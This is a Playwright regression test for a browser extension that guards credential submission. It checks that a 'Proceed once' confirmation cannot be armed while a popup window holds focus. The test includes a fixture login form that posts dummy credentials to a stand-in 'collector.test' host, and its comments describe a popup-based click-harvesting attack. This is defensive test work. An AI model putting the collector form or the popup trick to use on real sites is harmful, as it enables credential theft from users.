import { chromium, expect, test, type BrowserContext } from "@playwright/test";
import fs from "node:fs";
import path from "node:path";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import { DBLCLICK_WINDOW_MS } from "../../extension/src/shared/doubleclick_timing";
import { evaluateInCredentialModal, getServiceWorker, waitForCredentialModal } from "./extension_test_utils";

// #1225: no rendering observer can see another browser window over ours. A page can open
// a small popup over Proceed once, let the 800 ms arming window fill behind it, close it on
// the first press and harvest the second click. Arming must require our window's focus.
test("Proceed once does not arm while another window has focus (#1225) @regression", async () => {
  test.setTimeout(90_000);
  const extensionPath = path.resolve("extension/dist");
  expect(fs.existsSync(extensionPath), "build required").toBe(true);
  fs.mkdirSync("test-results", { recursive: true });
  const profile = fs.mkdtempSync(path.resolve("test-results/credential-focus-profile-"));
  let context: BrowserContext | undefined;
  try {
    context = await chromium.launchPersistentContext(profile, {
      headless: false,
      args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
    });
    const worker = await getServiceWorker(context);
    await worker.evaluate(async (key) => {
      await chrome.storage.local.set({ [key]: {
        credential: { mode: "smart", promptOnUntrustedDomain: true, blockHttpPasswordSubmit: false },
        nav: { defaultMode: "smart", debug: false },
      } });
    }, SUITE_SETTINGS_KEY);
    let posts = 0;
    // All fixture requests are intercepted locally; credentials are dummy data.
    await context.route("http://victim.test/**", (route) => route.fulfill({ contentType: "text/html", body: `
      <form method="post" action="http://collector.test/collect">
        <input name="user" value="synthetic@example.invalid">
        <input name="password" type="password" value="dummy-focus">
        <button id="go">Sign in</button>
      </form>` }));
    await context.route("http://collector.test/**", async (route) => {
      if (route.request().method() === "POST") posts++;
      await route.fulfill({ contentType: "text/html", body: "<p>Fixture received</p>" });
    });
    const page = await context.newPage();
    // Playwright emulates focus for every page; this test needs real window focus.
    const cdp = await context.newCDPSession(page);
    await cdp.send("Emulation.setFocusEmulationEnabled", { enabled: false });
    await page.goto("http://victim.test/login");
    await page.bringToFront();
    await page.waitForTimeout(300);
    await page.click("#go", { noWaitAfter: true });
    await waitForCredentialModal(page);

    // Another browser window, offset so ours stays partly uncovered and keeps rendering,
    // takes focus for the whole arming window and then closes (the issue's popup).
    // Same-window tabs throttle animation frames, which already resets arming; record the
    // longest frame gap so the test cannot pass that way.
    await page.evaluate(() => {
      const probe = window as unknown as { maxFrameGap: number };
      probe.maxFrameGap = 0;
      let last = performance.now();
      const tick = (now: number) => {
        probe.maxFrameGap = Math.max(probe.maxFrameGap, now - last);
        last = now;
        requestAnimationFrame(tick);
      };
      requestAnimationFrame(tick);
    });
    const main = await cdp.send("Browser.getWindowForTarget");
    const opened = context.waitForEvent("page");
    await cdp.send("Target.createTarget", {
      url: "about:blank", newWindow: true,
      left: (main.bounds.left ?? 0) + 40, top: (main.bounds.top ?? 0) + 40,
    });
    const popup = await opened;
    await popup.bringToFront();
    await expect.poll(() => page.evaluate(() => document.hasFocus())).toBe(false);
    await popup.waitForTimeout(DBLCLICK_WINDOW_MS + 700);
    expect(await page.evaluate(() => document.visibilityState), "our page stayed visible behind the popup").toBe("visible");
    expect(await page.evaluate(() => (window as unknown as { maxFrameGap: number }).maxFrameGap),
      "our page kept rendering behind the popup, not throttled as a background tab").toBeLessThan(500);
    await popup.close();
    await page.bringToFront();
    await expect.poll(() => page.evaluate(() => document.hasFocus())).toBe(true);

    const point = await evaluateInCredentialModal(page, function (this: ShadowRoot) {
      const button = Array.from(this.querySelectorAll("button")).find((b) => b.textContent === "Proceed once")!;
      const rect = button.getBoundingClientRect();
      return { x: rect.x + rect.width / 2, y: rect.y + rect.height / 2 };
    });
    await page.mouse.click(point!.x, point!.y);
    await page.waitForTimeout(1000);
    expect(posts, "the click right after focus returns must be refused").toBe(0);

    // With focus back for the arming window, the same click approves.
    await page.waitForTimeout(DBLCLICK_WINDOW_MS + 700);
    await page.mouse.click(point!.x, point!.y);
    await expect.poll(() => posts, { timeout: 5000 }).toBe(1);
  } finally {
    await context?.close();
    fs.rmSync(profile, { recursive: true, force: true });
  }
});
